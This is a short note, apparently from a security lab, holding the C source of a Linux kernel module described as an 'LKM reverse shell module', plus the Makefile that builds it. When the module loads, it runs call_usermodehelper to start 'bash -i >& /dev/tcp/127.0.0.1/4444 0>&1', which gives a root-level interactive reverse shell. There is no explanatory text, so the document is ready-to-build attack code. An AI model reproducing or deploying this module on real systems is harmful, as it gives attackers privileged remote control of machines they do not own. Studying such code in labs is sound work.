# code
```C
#include <linux/kmod.h>

#include <linux/module.h>

MODULE_LICENSE("GPL");

MODULE_AUTHOR("AttackDefense");

MODULE_DESCRIPTION("LKM reverse shell module");

MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", NULL};

static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init reverse_shell_init(void) {

return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

}

static void __exit reverse_shell_exit(void) {

printk(KERN_INFO "Exiting\n");

}

module_init(reverse_shell_init);

module_exit(reverse_shell_exit);
```

^dcedab

# makefile
```makefile
obj-m +=reverse-shell.o

all:

make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:

make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

^e35de3
